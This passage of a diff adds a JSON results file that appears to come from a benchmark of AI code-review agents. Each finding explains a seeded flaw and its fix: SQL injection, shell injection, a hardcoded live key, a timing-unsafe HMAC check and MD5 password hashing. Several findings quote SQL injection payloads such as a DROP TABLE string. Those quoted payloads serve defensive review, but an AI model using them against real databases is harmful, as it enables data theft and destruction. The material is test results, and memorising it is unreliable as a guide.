+              "matched_label": "tests/fixtures/acmepay.py:6",
+              "matched_labels": [
+                "tests/fixtures/acmepay.py:6"
+              ],
+              "cites": [
+                "tests/fixtures/acmepay.py:6",
+                "billing/acmepay_client.py:7"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-sql-injection-fstring",
+          "hits": 1,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.856,
+          "cost_usd": 0.0949,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "injection",
+              "severity": "critical",
+              "confidence": 0.92,
+              "where": "billing/queries.py:8-10",
+              "title": "SQL injection via f-string interpolation in search_customers",
+              "body": "`search_customers` interpolates `term` and `status` straight into the SQL text and calls `execute(sql)` with no parameter tuple, so the values are parsed as SQL rather than bound as data. A caller value containing a single quote closes the literal: e.g. `status = \"x' OR '1'='1\"` returns every customer row, and `term = \"%'; DROP TABLE customers; --\"` or a `UNION SELECT` payload reaches the interpreter unchanged.\n\nAdversary: anyone who can reach the support search surface this endpoint backs (per the PR description, support staff typing a free-text name/status \u2014 and any request path that proxies to it). What they control: the full text of both `term` and `status`. What they get: arbitrary read of the `customers` table (and whatever else the DB user can touch), i.e. mass data exfiltration or destruction.\n\nFix by following the pattern already used one function above and the contract in `billing/db.py`:\n\n```python\ndef search_customers(term, status):\n    return execute(\n        \"SELECT * FROM customers WHERE name LIKE %s AND status = %s\",\n        (f\"%{term}%\", status),\n    )\n```\n\nNote the wildcards belong in the bound parameter, not in the SQL text. If `term` may itself contain `%` or `_`, escape them and add an `ESCAPE` clause.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/queries.py:9",
+              "matched_labels": [
+                "billing/queries.py:9"
+              ],
+              "cites": [
+                "billing/queries.py:9",
+                "billing/queries.py:10",
+                "billing/db.py:4",
+                "billing/queries.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.9,
+              "where": "billing/queries.py:9-10",
+              "title": "search_customers bypasses execute()'s required params argument",
+              "body": "`billing/db.execute(sql, params=None)` documents that \"`params` must carry every caller value\", and the sibling `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` builds a fully interpolated string and calls `execute(sql)` with no params, so the two callers of the same helper now use incompatible conventions. Rewrite as `execute(\"SELECT * FROM customers WHERE name LIKE %s AND status = %s\", (f\"%{term}%\", status))`.",
+              "agreeing": [
+                "correctness"
+              ],
+              "categories": [
+                "api_contract",
+                "logic"
+              ],
+              "matched_label": "billing/queries.py:9",
+              "matched_labels": [
+                "billing/queries.py:9"
+              ],
+              "cites": [
+                "billing/queries.py:9",
+                "billing/db.py:4",
+                "billing/queries.py:4"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.75,
+              "where": "billing/queries.py:8-10",
+              "title": "No test coverage for search_customers query construction",
+              "body": "search_customers builds its SQL via f-string interpolation of `term` and `status` rather than passing them as `execute` parameters (contrast with get_customer's parameterised call). No test exercises this function, so there is nothing that would fail if the interpolation were fixed incorrectly, if quoting/escaping broke, or if the query logic (LIKE pattern, AND condition) changed. Add a test asserting the exact SQL string and params passed to `execute` (e.g. via a fake/spy on `execute`) to lock in correct, parameterised behavior.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "billing/queries.py:8"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "docs",
+              "category": "documentation",
+              "severity": "info",
+              "confidence": 0.72,
+              "where": "billing/queries.py:8-9",
+              "title": "Public search function lacks contract documentation",
+              "body": "The `search_customers` function is a new public API (not prefixed with `_`) with parameters whose expected types and semantics are not self-evident from the signature, and the return contract is not obvious. A caller trying to use this function cannot determine whether `term` should be a string, what SQL wildcards are safe, what `status` values are valid, or what the return value represents without reading the implementation. Add a docstring documenting the parameters, return value, and any constraints on valid inputs.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "billing/queries.py:8",
+                "billing/queries.py:4"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-timing-unsafe-compare",
+          "hits": 1,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "auto_post",
+          "expected_decision": null,
+          "confidence": 0.795,
+          "cost_usd": 0.0661,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "crypto",
+              "severity": "major",
+              "confidence": 0.99,
+              "where": "webhooks/verify.py:12",
+              "title": "verify_acmepay compares HMAC with == instead of compare_digest",
+              "body": "`verify_acmepay` computes the same HMAC-SHA256 digest as `verify_stripe` but returns `expected == header`. Python's `==` on `str` short-circuits at the first differing byte, so comparison time leaks a prefix-match length and lets an attacker who can submit repeated webhook deliveries recover a valid signature byte by byte. The sibling function three lines above already does the right thing. Change line 12 to `return hmac.compare_digest(expected, header)`.\n\nNote the two are not perfectly interchangeable on bad input: `==` returns `False` for a non-str/`None` header, whereas `compare_digest` raises `TypeError`. If callers can pass a missing header, guard with `if not isinstance(header, str): return False` before the comparison so the switch does not turn a rejected request into a 500.\n\n_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "crypto"
+              ],
+              "matched_label": "webhooks/verify.py:12",
+              "matched_labels": [
+                "webhooks/verify.py:12"
+              ],
+              "cites": [
+                "webhooks/verify.py:10",
+                "webhooks/verify.py:5",
+                "webhooks/verify.py:12",
+                "webhooks/verify.py:7"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "webhooks/verify.py:10-12",
+              "title": "New webhook verification function has no test coverage",
+              "body": "verify_acmepay is added with no accompanying test. Nothing would catch a regression in its logic (e.g. the use of == instead of hmac.compare_digest, or a broken HMAC computation) since no test exercises this function at all.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "webhooks/verify.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-weak-password-hash",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 1,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.687,
+          "cost_usd": 0.0909,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "crypto",
+              "severity": "major",
+              "confidence": 0.92,
+              "where": "auth/passwords.py:10-11",
+              "title": "Reset flow hashes passwords with unsalted MD5 instead of bcrypt",
+              "body": "`hash_reset_password` returns a bare, unsalted MD5 digest of the user's new password. MD5 is a fast, GPU-friendly hash with no salt or work factor here, so the digests are recoverable by rainbow-table lookup or offline brute force at billions of guesses per second. Anyone who obtains the credential store \u2014 via a SQL injection, a leaked backup, an over-permissioned replica, or an insider \u2014 gets the plaintext passwords of every user who went through the reset path, and those passwords are commonly reused on other services.\n\nThe correct primitive is already imported and used two lines above. Replace the body with the same construction as `hash_password`:\n\n```python\ndef hash_reset_password(raw):\n    return bcrypt.hashpw(raw.encode(), bcrypt.gensalt()).decode()\n```\n\nIf the reset path genuinely needs a distinct function (for example to tag the hash), it should still wrap bcrypt. Note also that verification code will now see two incompatible hash formats in the same column; consider whether `hash_reset_password` should exist at all rather than deferring to `hash_password`. Existing MD5 digests already written by this path should be invalidated and the affected users forced to reset again.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "auth/passwords.py:11",
+              "matched_labels": [
+                "auth/passwords.py:11"
+              ],
+              "cites": [
+                "auth/passwords.py:10",
+                "auth/passwords.py:6"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.62,
+              "where": "auth/passwords.py:10-11",
+              "title": "Reset hash format is incompatible with existing bcrypt verification",
+              "body": "`hash_password` returns a bcrypt modular-crypt string (`$2b$...`), but `hash_reset_password` returns a bare 32-char MD5 hex digest. If both write to the same stored password column, the existing verification routine (presumably `bcrypt.checkpw`, which raises or returns False on a non-bcrypt salt) will never accept a password set through the reset path, locking the user out. Either route the reset flow through `hash_password` so one format is stored, or make the storage/verification explicitly format-tagged so both can be validated. (Separately, an unsalted single-round digest is unsuitable for passwords at all.)",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "auth/passwords.py:10",
+              "matched_labels": [
+                "auth/passwords.py:10"
+              ],
+              "cites": [
+                "auth/passwords.py:6",
+                "auth/passwords.py:10"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "auth/passwords.py:10-11",
+              "title": "New password-reset hashing has no test coverage",
+              "body": "hash_reset_password is a new function used on a password-reset path with no accompanying test. If its behavior changes (e.g. algorithm swapped, output format changed, or a regression introduced), nothing would catch it. Since this handles password material, a broken or altered implementation could silently ship.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "auth/passwords.py:10"
+              ]
+            },
+            {
+              "match": "unlabelled",
+              "agent": "correctness",
+              "category": "resource_leak",
+              "severity": "minor",
+              "confidence": 0.55,
+              "where": "auth/passwords.py:14-16",
+              "title": "checksum() loads the entire file into memory",
+              "body": "`fh.read()` materialises the whole file before hashing. For any large input this is an avoidable memory spike and can OOM the process. Hash in fixed-size chunks instead (e.g. a loop over `fh.read(65536)` feeding `h.update`).",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "auth/passwords.py:14"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "trap-md5-for-cache-key",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "auto_post",
+          "expected_decision": null,
+          "confidence": 0.72,
+          "cost_usd": 0.1132,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "major",
+              "confidence": 0.72,
+              "where": "render/cache.py:9-10",
+              "title": "json.dumps narrows accepted context values vs. the old tuple key",
+              "body": "The previous key `(template_source, tuple(sorted(context.items())))` accepted any *hashable* value \u2014 `datetime`, `Decimal`, enums, frozensets, custom objects with `__hash__`. `json.dumps` accepts only JSON-native types and raises `TypeError: Object of type X is not JSON serializable`. Any existing caller passing a non-JSON value into `context` now gets an exception from the cache layer before `_render` is ever reached, turning a working render into a hard failure. If contexts really can hold arbitrary objects, key on a serializer that tolerates them (e.g. `default=repr` plus a type tag, or keep the tuple key); otherwise validate/convert at the boundary and document the restriction.",
+              "agreeing": [
+                "correctness"
+              ],
+              "categories": [
+                "api_contract",
+                "logic"
+              ],
+              "matched_label": "render/cache.py:9",
+              "matched_labels": [
+                "render/cache.py:9"
+              ],
+              "cites": [
+                "render/cache.py:9",
+                "render/cache.py:11",
+                "tests/test_cache.py:13"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "trap-subprocess-list-args",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": null,
+          "confidence": 0.6,
+          "cost_usd": 0.1424,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_quality",
+              "severity": "major",
+              "confidence": 0.65,
+              "where": "tests/test_archive.py:6-8",
+              "title": "Test asserts only shell=False, not the actual argv list",
+              "body": "test_runs_without_a_shell only checks spy.last_call.kwargs['shell'] is False. It never inspects the command list (args) that was passed to subprocess.run \u2014 the very thing the PR changed to prevent shell injection (interpolating name/directory into a single shell string vs. passing a list). A regression that keeps shell=False but rebuilds the command as an f-string (e.g. subprocess.run(f'tar -czf ...', shell=False)) would pass this test even though it reintroduces a broken/insecure invocation (it would actually raise FileNotFoundError at real runtime, but against a spy that just records kwargs it would silently pass). The test should also assert on spy.last_call.args (or equivalent) to confirm the command is a list with name/directory as separate elements.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/test_archive.py:6",
+              "matched_labels": [
+                "tests/test_archive.py:6"
+              ],
+              "cites": [
+                "tests/test_archive.py:6"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "security",
+              "category": "input_validation",
+              "severity": "major",
+              "confidence": 0.55,
+              "where": "export/archive.py:12",
+              "title": "`directory` is unvalidated and selects what tar reads",
+              "body": "`name` is now allowlisted, but `directory` is passed straight through to tar as the path to archive. Switching to list argv removes shell injection and the `--` blocks option injection, so this is no longer a command-execution issue \u2014 but it is still an arbitrary-path read. If `directory` originates from a request parameter, a caller can pass `/etc`, `/root/.ssh`, or `/exports` itself and have those contents packed into `/exports/<name>.tar.gz`, which is then presumably retrievable by whoever can name the archive.\n\nAdversary: whoever supplies the export request. Controls: the `directory` argument. Gets: contents of any directory readable by the tar process, delivered as a downloadable archive. Consider resolving the path (`os.path.realpath`) and asserting it stays under an allowed export root, mirroring the allowlist already applied to `name`.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:7",
+                "export/archive.py:9",
+                "export/archive.py:12"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "minor",
+              "confidence": 0.6,
+              "where": "export/archive.py:9-10",
+              "title": "New name validation rejects inputs existing callers may still pass",
+              "body": "`create_archive` previously accepted any `name` and interpolated it into the command. It now raises `ValueError` for anything outside `[A-Za-z0-9_-]{1,64}`, which excludes several shapes that callers plausibly already use: dotted names (`report.v2`), timestamped names containing `:` or `.` (`backup-2024-01-01T00:00:00`), names with spaces, and anything longer than 64 characters. Any such call site turns from a working archive into an uncaught exception at runtime.\n\nSeparately, if `name` is not a `str` (e.g. a `pathlib.Path` or an `int`, both of which worked fine under the old f-string), `SAFE_NAME.fullmatch(name)` raises `TypeError`, not the documented `ValueError` \u2014 so a caller that defensively catches `ValueError` still crashes.\n\nSuggested: coerce with `name = str(name)` before matching (or explicitly reject non-str with `ValueError`), and confirm the allowlist covers the name shapes real callers produce \u2014 widening it to permit `.` and raising the length cap is cheap and keeps the injection fix intact. No callers were retrieved for this change, so this needs a grep of the call sites before merging.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:11",
+              "matched_labels": [
+                "export/archive.py:11"
+              ],
+              "cites": [
+                "export/archive.py:9",
+                "export/archive.py:4"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "provider": "anthropic",
+      "models": {
+        "security": "claude-opus-5",
+        "correctness": "claude-opus-5",
+        "tests": "claude-sonnet-5",
+        "docs": "claude-haiku-4-5"
+      },
+      "cases": 8,
+      "overall": {
+        "hits": 8,
+        "allowed": 12,
+        "labels_found": 8,
+        "concerns": 8,
+        "duplicate_rate": 1.0,
+        "false_positives": 0,
+        "unlabelled": 0,
+        "misses": 0,
+        "precision_strict": 1.0,
+        "precision_lenient": 1.0,
+        "recall": 1.0,
+        "f1": 1.0
+      },
+      "by_agent": {
+        "correctness": {
+          "hits": 5,
+          "allowed": 5,
+          "labels_found": 5,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 1.0,
+          "precision_lenient": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "security": {
+          "hits": 3,
+          "allowed": 1,
+          "labels_found": 3,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 1.0,
+          "precision_lenient": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "tests": {
+          "hits": 0,
+          "allowed": 6,
+          "labels_found": 0,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 0.0,
+          "precision_lenient": 0.0,
+          "recall": 0.0,
+          "f1": 0.0
+        }
+      },
+      "calibration": {
+        "bins": [
+          {
+            "range": "0.50-0.60",
+            "n": 1,
+            "mean_confidence": 0.55,
+            "observed_hit_rate": 1.0,
+            "gap": 0.45
+          },
+          {
+            "range": "0.60-0.70",
+            "n": 1,
+            "mean_confidence": 0.62,
+            "observed_hit_rate": 1.0,
+            "gap": 0.38
+          },
+          {
+            "range": "0.80-0.90",
+            "n": 2,
+            "mean_confidence": 0.88,
+            "observed_hit_rate": 1.0,
+            "gap": 0.12
+          },
+          {
+            "range": "0.90-1.01",
+            "n": 4,
+            "mean_confidence": 0.963,
+            "observed_hit_rate": 1.0,
+            "gap": 0.037
+          }
+        ],
+        "expected_calibration_error": 0.152
+      },
+      "category_agreement": 0.875,
+      "agent_attribution": 1.0,
+      "decision_accuracy": 1.0,
+      "cost": {
+        "total_usd": 0.7158,
+        "per_case_usd": 0.0895
+      },
+      "per_case": [
+        {
+          "id": "neg-allowlisted-dynamic-sql",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "suppress",
+          "expected_decision": "suppress",
+          "confidence": 1.0,
+          "cost_usd": 0.0426,
+          "failed_agents": [],
+          "error": null,
+          "findings": []
+        },
+        {
+          "id": "sec-command-injection",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.772,
+          "cost_usd": 0.0907,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "injection",
+              "severity": "critical",
+              "confidence": 0.982,
+              "where": "export/archive.py:8-10",
+              "title": "Unquoted f-string interpolated into shell=True command",
+              "body": "`cmd` is built by interpolating `name` and `directory` directly into a shell string and executed with `shell=True`. Two concrete failures: (1) correctness \u2014 any directory or archive name containing a space (`My Docs`) is split into two arguments and tar archives the wrong paths or fails; names containing `*`, `~` or `$` are expanded by the shell. (2) Anything containing `;`, `&&`, backticks or `$(...)` executes as a separate command with the privileges of this process. The sibling `list_exports` on line 5 already uses the correct form. Build an argument list and drop `shell`: `subprocess.run([\"tar\", \"-czf\", f\"/exports/{name}.tar.gz\", directory], check=True)`, and validate that `name` contains no path separators so it cannot escape `/exports`.\n\n_Also raised by the security agent:_ Shell injection via interpolated name/directory in create_archive",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "injection"
+              ],
+              "matched_label": "export/archive.py:9",
+              "matched_labels": [
+                "export/archive.py:9"
+              ],
+              "cites": [
+                "export/archive.py:9",
+                "export/archive.py:10",
+                "export/archive.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "export/archive.py:8-10",
+              "title": "New create_archive function has no tests",
+              "body": "create_archive builds a shell command via string interpolation of `name` and `directory` and runs it with shell=True. There is no test in this diff exercising this function, so a change that broke archive creation (e.g. wrong tar flags, wrong path, or a regression allowing command injection through `name`/`directory`) would not be caught by any existing test suite.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "export/archive.py:8"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "minor",
+              "confidence": 0.55,
+              "where": "export/archive.py:10",
+              "title": "create_archive returns CompletedProcess while list_exports returns bytes",
+              "body": "`list_exports` returns `.stdout` (bytes), whereas `create_archive` returns the whole `CompletedProcess` object. A caller treating the two module functions alike will get an object where it expects bytes. Consider returning the archive path (`/exports/{name}.tar.gz`) or `None`, so the return value is meaningful rather than an implementation detail of how the archive was produced.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "export/archive.py:9",
+              "matched_labels": [
+                "export/archive.py:9"
+              ],
+              "cites": [
+                "export/archive.py:5",
+                "export/archive.py:10"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-hardcoded-credential",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.799,
+          "cost_usd": 0.0945,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "secrets",
+              "severity": "critical",
+              "confidence": 0.96,
+              "where": "billing/acmepay_client.py:4-8",
+              "title": "Live AcmePay secret key hardcoded in source, replacing env lookup",
+              "body": "`ACMEPAY_SECRET_KEY` is a literal credential with an `acme_live_` prefix, indicating a production API key, and it is now assigned to `acmepay.api_key` in place of the previous `os.environ[\"ACMEPAY_SECRET_KEY\"]` lookup. Anyone with read access to the repository (or to any clone, fork, CI log, container image, or packaged artifact built from it) can read this key and use it to issue charges, refunds, or read customer payment data against the live account.\n\nActions: (1) treat this key as compromised and rotate it at AcmePay immediately; (2) restore the `os.environ[\"ACMEPAY_SECRET_KEY\"]` read (or a secrets-manager lookup); (3) purge the value from git history, since reverting the commit leaves it retrievable; (4) consider a pre-commit secret scanner so the next one is caught before it lands.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/acmepay_client.py:4",
+              "matched_labels": [
+                "billing/acmepay_client.py:4"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:4",
+                "billing/acmepay_client.py:8"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "logic",
+              "severity": "major",
+              "confidence": 0.88,
+              "where": "billing/acmepay_client.py:4-8",
+              "title": "Key is no longer environment-configurable; all envs use one baked-in key",
+              "body": "`client()` previously read `os.environ[\"ACMEPAY_SECRET_KEY\"]`, which let each deployment (dev, CI, staging, prod) supply its own credential and failed loudly with `KeyError` when none was configured. After this change the value is a module constant, so any `ACMEPAY_SECRET_KEY` already set in deployment manifests or CI is silently ignored and every environment authenticates with the same `acme_live_...` value \u2014 non-production runs and test suites will issue real charges against the live account with no error to signal it. Restore the environment lookup (or route it through the project's settings/config layer) so the credential varies per environment and a missing value still fails fast.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/acmepay_client.py:4",
+              "matched_labels": [
+                "billing/acmepay_client.py:4"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:4",
+                "billing/acmepay_client.py:8"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.6,
+              "where": "billing/acmepay_client.py:7-8",
+              "title": "client() key-source behavior change has no test verifying it",
+              "body": "client() previously read acmepay.api_key from os.environ[\"ACMEPAY_SECRET_KEY\"] and now assigns a hardcoded module-level constant. No test in this diff calls client() and asserts what acmepay.api_key ends up set to. The added tests/fixtures/acmepay.py only defines a fixture (fake_client/TEST_KEY) but does not invoke or assert against billing.acmepay_client.client(). If this wiring regresses (e.g., reverts to reading a stale env var, or points at the wrong key), no test would fail.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/fixtures/acmepay.py:6",
+              "matched_labels": [
+                "tests/fixtures/acmepay.py:6"
+              ],
+              "cites": [
+                "billing/acmepay_client.py:7",
+                "tests/fixtures/acmepay.py:6"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "test_quality",
+              "severity": "minor",
+              "confidence": 0.6,
+              "where": "tests/fixtures/acmepay.py:6-7",
+              "title": "fake_client() return shape does not match client()",
+              "body": "`client()` returns the `acmepay` module object (with the key set as the module attribute `api_key`), while `fake_client()` returns a plain dict `{\"api_key\": TEST_KEY}`. Anything that substitutes the fixture for the real client and then calls an API method (`acmepay.Charge.create(...)`, etc.) will fail with `TypeError`/`AttributeError` rather than exercising the code under test, and attribute-style access (`c.api_key`) will not work on the dict. Return a stub object exposing the same attributes/methods the production client is used through, so the fixture is a faithful stand-in.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "tests/fixtures/acmepay.py:6",
+              "matched_labels": [
+                "tests/fixtures/acmepay.py:6"
+              ],
+              "cites": [
+                "tests/fixtures/acmepay.py:6",
+                "billing/acmepay_client.py:7"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-sql-injection-fstring",
+          "hits": 1,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.902,
+          "cost_usd": 0.0941,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "allowed",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "critical",
+              "confidence": 0.99,
+              "where": "billing/queries.py:8-10",
+              "title": "search_customers interpolates values instead of parameterising execute()",
+              "body": "`billing.db.execute` documents that `params` must carry every caller value, and the sibling `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` instead formats `term` and `status` directly into the SQL string and calls `execute(sql)` with no params. Two concrete consequences:\n\n1. Any value containing a single quote \u2014 a perfectly ordinary customer name such as `O'Brien` \u2014 terminates the string literal and produces a malformed statement, so the lookup raises instead of returning results. Worse, the same mechanism lets a caller-supplied `term`/`status` append arbitrary SQL, which is executed with the application's database privileges.\n2. `term` and `status` are not validated; a `None` reaching line 9 is rendered as the literal text `None` and silently matches nothing rather than erroring.\n\nRewrite using placeholders and let the driver bind the values, e.g.:\n\n```python\ndef search_customers(term, status):\n    sql = \"SELECT * FROM customers WHERE name LIKE %s AND status = %s\"\n    return execute(sql, (f\"%{term}%\", status))\n```\n\nThis keeps the LIKE wildcards in the parameter (not the SQL), matching the contract that `execute` states and that `get_customer` already honours.\n\n_Also raised by the docs agent:_ Public API violates documented db.execute() contract",
+              "agreeing": [
+                "correctness",
+                "docs"
+              ],
+              "categories": [
+                "api_contract"
+              ],
+              "matched_label": "billing/queries.py:9",
+              "matched_labels": [
+                "billing/queries.py:9"
+              ],
+              "cites": [
+                "billing/queries.py:9",
+                "billing/queries.py:10",
+                "billing/db.py:4",
+                "billing/queries.py:5",
+                "billing/queries.py:9",
+                "billing/queries.py:10"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "security",
+              "category": "injection",
+              "severity": "critical",
+              "confidence": 0.92,
+              "where": "billing/queries.py:8-10",
+              "title": "SQL injection via f-string interpolation in search_customers",
+              "body": "`search_customers` concatenates `term` and `status` directly into the SQL string with an f-string and then calls `execute(sql)` with no `params`, so the values are parsed as SQL, not bound as data. Both values are inside single-quoted literals, so a supplied `'` closes the literal and everything after it is executed \u2014 e.g. `status = \"x' OR '1'='1\"` returns every customer row, and `term = \"%'; DROP TABLE customers; --\"` reaches the interpreter unescaped.\n\nUse the same parameterised form as `get_customer` on line 5, keeping the wildcards in the bound value rather than the SQL text:\n\n```python\ndef search_customers(term, status):\n    sql = \"SELECT * FROM customers WHERE name LIKE %s AND status = %s\"\n    return execute(sql, (f\"%{term}%\", status))\n```",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": "billing/queries.py:9",
+              "matched_labels": [
+                "billing/queries.py:9"
+              ],
+              "cites": [
+                "billing/queries.py:9",
+                "billing/queries.py:10",
+                "billing/db.py:4",
+                "billing/queries.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.75,
+              "where": "billing/queries.py:8-10",
+              "title": "No test exercises search_customers, including its unsafe query construction",
+              "body": "search_customers builds SQL by directly interpolating `term` and `status` into the query string instead of using the parameterised `execute(sql, params)` convention shown by get_customer just above it. There is no test file in this diff verifying the SQL produced or the values passed to execute, so a regression here (or the underlying injection risk) would not be caught by any existing suite.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "billing/queries.py:8"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "sec-timing-unsafe-compare",
+          "hits": 1,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "auto_post",
+          "expected_decision": null,
+          "confidence": 0.795,
+          "cost_usd": 0.0702,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "crypto",
+              "severity": "major",
+              "confidence": 0.99,
+              "where": "webhooks/verify.py:12",
+              "title": "verify_acmepay compares HMAC with == instead of compare_digest",
+              "body": "`verify_acmepay` computes the same hex-digest HMAC as `verify_stripe` but validates it with `expected == header`. Python's string `==` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature are correct, allowing an attacker who can submit repeated webhook deliveries to recover a valid signature byte-by-byte without knowing the secret. Replace line 12 with `return hmac.compare_digest(expected, header)`, matching line 7.\n\nNote also the behavioural difference this introduces for callers: `compare_digest` raises `TypeError` on a non-str/bytes `header` (e.g. a missing header passed as `None`), whereas `==` silently returns `False`. Switching to `compare_digest` makes the two verifiers consistent, but confirm the call site handles a missing header before reaching this function.\n\n_Also raised by the security agent:_ Non-constant-time comparison of AcmePay webhook signature",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "crypto"
+              ],
+              "matched_label": "webhooks/verify.py:12",
+              "matched_labels": [
+                "webhooks/verify.py:12"
+              ],
+              "cites": [
+                "webhooks/verify.py:12",
+                "webhooks/verify.py:7",
+                "webhooks/verify.py:10"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
